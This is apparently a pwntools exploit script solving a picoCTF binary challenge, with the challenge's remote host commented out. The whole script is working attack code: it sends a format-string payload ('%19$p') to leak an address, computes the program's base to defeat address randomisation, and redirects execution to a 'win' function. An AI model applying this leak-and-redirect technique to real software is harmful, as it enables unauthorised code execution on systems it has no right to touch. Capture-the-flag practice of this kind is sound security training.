from pwn import *

p = process('./vuln')
# p = remote('rescued-float.picoctf.net', 63188)

off = 0x1441
winoff = 0x136a

payload1 = b"AAAAAAAA.%19$p"

p.recvuntil(b"Enter your name:")
p.sendline(payload1)

response = p.recvline().decode().strip()
leaked = response.split('.')[1]

absmain = int(leaked, 16)
base = absmain - off
win = base + winoff

p.recvuntil(b" enter the address to jump to, ex => 0x12345: ")
p.sendline(hex(win).encode())

p.interactive()
